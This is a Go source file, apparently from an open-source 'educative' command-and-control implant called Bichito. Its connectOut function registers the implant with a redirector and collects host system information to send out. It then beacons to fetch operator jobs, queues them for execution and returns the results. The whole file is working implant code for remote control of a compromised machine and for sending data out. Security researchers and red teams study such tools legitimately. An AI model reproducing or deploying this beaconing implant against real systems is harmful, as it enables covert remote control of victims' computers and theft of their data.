//{{{{{{{ Bichito High-Level Communications with Redirector }}}}}}}

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"strings"
	"encoding/json"
	"bichito/modules/network"
	"bichito/modules/biterpreter"
	"fmt"
	"bytes"
	"time"
)


// A. Check if BID is correct, if not send checking Job
// B. Retrieve Jobs from target redirector, if connection error return failure
// C. Send Processed Jobs to target redirector,if connection error return failure

func connectOut() string{
	
	var newJobs []*Job
	var encodedJobs []byte
	var error string
		
	//If Bid is not correct yet, send checking package again
	if !strings.Contains(bid,"B-"){

		bid = fmt.Sprintf("%s%s","B-",randomString(8))
		jobChecking := &Job{"","","",bid,"BiChecking","","","",""}
	
		var jobsChecking = []*Job{jobChecking}
        bufRC := new(bytes.Buffer)
        json.NewEncoder(bufRC).Encode(jobsChecking)
		resultRP := bufRC.String()

	
		//Prepare Authentication with Bid for next Connections
		biauth := BiAuth{bid,biconfig.Token}
		bufRP := new(bytes.Buffer)
		json.NewEncoder(bufRP).Encode(biauth)
		resultRP = bufRP.String()
		authbearer = resultRP
		authbearer = strings.TrimSuffix(authbearer, "\n")

		//Checking(redirector,authentication,bid,[]byte(resultRP))
		return "Success"
	}
	
	if sysinfo != true {
		
		errorS,info := biterpreter.Sysinfo()
		if errorS{
			info = "Error Getting System Info:"+info
			return info
		}

		jobsysinfo := &Job{"","","",bid,"sysinfo","","Success",info,""}


		jobsToHive.mux.Lock()
		jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
		jobsToHive.mux.Unlock()

		sysinfo = true
	}

	//5 sec Timeout to perform Job retrieve
	var retrieveError string
	retrieveTimeout := time.NewTimer(time.Duration(5) * time.Second)
	retrieveErr := make(chan string, 1)
	retrieveCont := make(chan string, 1)

	go func(){
	
		//Get Any Jobs from Bots targeting this redirector
		encodedJobs,error = network.RetrieveJobs(redirectors[0],authbearer)
		if error != "Success"{
			retrieveError = error
			retrieveErr <- "error"
		}

		retrieveCont <- "continue"

	}()
	select{
		case <- retrieveCont:
		case <- retrieveErr:
			return retrieveError			
		case <- retrieveTimeout.C:
			return "Retrieve Jobs from Redirector Timeout"		
	}


	errD := json.Unmarshal(encodedJobs,&newJobs)
	if errD != nil{
		return "Error Decoding Jobs from Hive"+errD.Error()
	}

	//Lock shared Slice
	jobsToProcess.mux.Lock()
	jobsToProcess.Jobs = append(jobsToProcess.Jobs,newJobs...)
	jobsToProcess.mux.Unlock()
	
	
	

	//Debug: Jobs to be sent to Hive
	//fmt.Println("Jobs to be sent to Hive: ")
	//fmt.Println(jobsToHive.Jobs)

	//Encode Jobs
	bufRC := new(bytes.Buffer)
	json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
	jobsToHi := bufRC.String()

	//5 sec Timeout to perform Job Sending
	var sendError string
	sendTimeout := time.NewTimer(time.Duration(5) * time.Second)
	sendErr := make(chan string, 1)
	sendCont := make(chan string, 1)

	go func(){
		error = network.SendJobs(redirectors[0],authbearer,[]byte(jobsToHi))
		if error != "Success"{
			sendError = error
			sendErr <- "error"
		}

		sendCont <- "continue"
	}()
	select{
		case <- sendCont:
		case <- sendErr:
			//Flush Jobs to avoid Bichito getting stuck in following beaconings
			jobsToHive.mux.Lock()
			jobsToHive.Jobs = jobsToHive.Jobs[:0]
			jobsToHive.mux.Unlock()
			return retrieveError			
		case <- sendTimeout.C:
			//Flush Jobs to avoid Bichito getting stuck in following beaconings
			jobsToHive.mux.Lock()
			jobsToHive.Jobs = jobsToHive.Jobs[:0]
			jobsToHive.mux.Unlock() 
			return "Send Jobs to Redirector Timeout"		
	}

	jobsToHive.mux.Lock()
	jobsToHive.Jobs = jobsToHive.Jobs[:0]
	jobsToHive.mux.Unlock()

	return "Success"
}